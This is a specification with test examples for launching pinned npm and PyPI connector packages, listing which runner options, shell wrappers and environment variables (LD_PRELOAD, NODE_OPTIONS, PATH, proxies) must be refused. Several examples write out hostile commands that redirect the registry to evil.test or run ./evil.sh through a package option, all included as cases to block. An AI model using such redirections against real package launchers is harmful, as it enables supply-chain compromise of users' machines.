# contracts.connector-pin

- Status: active
- Since: 0.1.0
- Source: HAL-181; the `pin` on the `stdio` transport of `ConnectorClient` port v1 (HAL-231); plan phase 3, connector pinning; `app.package-runner-launch`, `app.connector-pin-version`; HAL-2527 (registry options, proxy, certificate and preload variables); HAL-2559 (a shell or another program, shell mode, folder, trust and proxy options, config-home and program-lookup variables, and a package option running another program)

Where an adapter implements `ConnectorFactory` for `stdio`, and a trusted connector's transport has a `pin`, it shall start exactly the pin's package at the pin's version, in a folder of its own that is neither the workspace nor inside it nor around it, also when the transport sets a `cwd`, and a new folder for each client. The program it spawns shall be an npm runner for an npm pin and a PyPI runner for a PyPI pin; its arguments shall name the package at the pin's version (`@acme/mail-mcp@2.3.1`, `mail-mcp==2.3.1`) and at no other version; its environment shall set the registry to `registryUrl` (`npm_config_registry` for npm; for PyPI at least one of `UV_DEFAULT_INDEX`, `UV_INDEX_URL` and `PIP_INDEX_URL`, at `{registryUrl}/simple`, with every one present saying the same); it shall pass on none of the package-manager and language variables `app.package-runner-launch` blocks with the value the adapter inherited; and it shall keep the proxy and certificate settings it inherited, which are the person's machine settings. It shall look the version up only at addresses under the pin's `registryUrl`, through the context's `http`, so a mirror in the user's profile is the only registry asked. It shall start no program when the registry doesn't list the version, doesn't hold the package or can't be reached; when the pin's version is a tag, a range or only part of a version, in which case it asks no registry at all; when the command asks for another version or another package, also through a package option or a PyPI spelling of the name; when the command has a runner option that fetches from somewhere other than the pin's registry, such as `--registry`, an npm scope's `--@acme:registry`, `--userconfig`, `--cache`, `--index-url` or `-i`, `--extra-index-url`, `--default-index`, `--find-links` or `--pip-args`, before or after the package, in any case and behind a shell; when the command is a shell, such as `sh -c` or `powershell -Command`, or another program that isn't a package runner, such as `env`, `node` or `wsl`; when it uses a runner's shell mode (`-c`, `--call`, `--shell-mode`); when it has an option that moves the folder, config, trust or proxy the runner reads, such as `--prefix`, `-C`, `--dir`, `--cwd`, `--directory`, `--project`, `--config.registry`, `--with-requirements`, `--with-editable`, `-c`, `--cafile`, `--strict-ssl`, `--trusted-host`, `--allow-insecure-host`, `--proxy`, `--https-proxy` or `--node-options`; when a package option (`-p`, `--package`, `--from`, `--with`, `--spec`) starts a command word that isn't the pinned package's, or none; and when the connector's `env` sets, in any case, a variable `app.package-runner-launch` blocks, including a proxy, a certificate setting, a preload, a config home or the program lookup (`HOME`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, `PATH`, `PATHEXT`, `COMSPEC`). A pinned command whose package option starts the pinned package itself, such as `npx -p @acme/mail-mcp@2.3.1 @acme/mail-mcp` or `pipx run --spec mail-mcp==2.3.1 mail-mcp`, shall start. Without a trust grant it shall neither look the package up nor start it. A package runner without a `pin` shall still start once trusted, with no registry lookup, also with a registry option or a proxy. Refusing may happen in `create` or on the first call.

The suite's registries answer from recorded npm and PyPI responses (`RecordedRegistryClient`): the npm package document at `{registryUrl}/{name}` and the PyPI JSON API at `{registryUrl}/pypi/{name}/json` and `{registryUrl}/pypi/{name}/{version}/json`, trimmed to the fields a version lookup reads; any other address, such as npm's `{registryUrl}/{name}/{version}`, answers 404. No case reaches a real registry. Each harness reports every program as it was spawned (`ConnectorLaunch`: `command`, `args`, `env`, `folder` and `pin`), and takes the suite's `inheritedEnv` as its own process's environment, which sets every blocked variable to move the registry or run code first, next to a company proxy and its certificate.

## Examples

- Given a trusted `npx -y @acme/mail-mcp` connector pinned to npm `@acme/mail-mcp` 2.3.1 at `https://npm.acme.test/registry`,
  when its tools are listed,
  then one program starts with that pin, its arguments name `@acme/mail-mcp@2.3.1`, its `npm_config_registry` is `https://npm.acme.test/registry`, it starts in a folder outside the workspace, and every registry address asked for lies under `https://npm.acme.test/registry`.
- Given that connector with `cwd` set to `tools/mail` inside the workspace,
  when its tools are listed,
  then its program starts neither in `tools/mail` nor anywhere in the workspace.
- Given an adapter whose own environment sets `npm_config_registry` to another registry and `NODE_OPTIONS`,
  when a pinned connector's tools are listed,
  then the program it spawns gets neither inherited value.
- Given the same connector with the command `npx -y @acme/mail-mcp@3.0.0`,
  when its tools are listed,
  then it throws and no program starts.
- Given a pin to version `latest`,
  when its tools are listed,
  then it throws, no program starts and no registry is asked.
- Given a pinned connector whose `env` sets `npm_config_registry`,
  when its tools are listed,
  then it throws and no program starts.
- Given an adapter whose own environment sets `HTTPS_PROXY` to a company proxy,
  when a pinned connector's tools are listed,
  then the program it spawns gets that proxy.
- Given a connector pinned to `@acme/mail-mcp` 2.3.1 with the command `npx --registry=https://evil.test -y @acme/mail-mcp`, or `uvx --index-url https://evil.test/simple mail-mcp` for a PyPI pin,
  when its tools are listed,
  then it throws and no program starts.
- Given a pinned connector whose `env` sets `HTTPS_PROXY`, `NODE_EXTRA_CA_CERTS` or `LD_PRELOAD`,
  when its tools are listed,
  then it throws and no program starts.
- Given a connector pinned to `@acme/mail-mcp` 2.3.1 with the command `sh -c "NPM_CONFIG_REGISTRY=https://evil.test npx -y @acme/mail-mcp"`, `env NPM_CONFIG_REGISTRY=https://evil.test npx -y @acme/mail-mcp`, `npx --prefix ./evil -y @acme/mail-mcp` or `npx -y -p @acme/mail-mcp@2.3.1 sh ./evil.sh`,
  when its tools are listed,
  then it throws and no program starts.
- Given a pinned connector whose `env` sets `HOME`, `APPDATA` or `PATH`,
  when its tools are listed,
  then it throws and no program starts.
- Given a connector pinned to `@acme/mail-mcp` 2.3.1 with the command `npx -y -p @acme/mail-mcp@2.3.1 @acme/mail-mcp`,
  when its tools are listed,
  then one program starts with that pin.
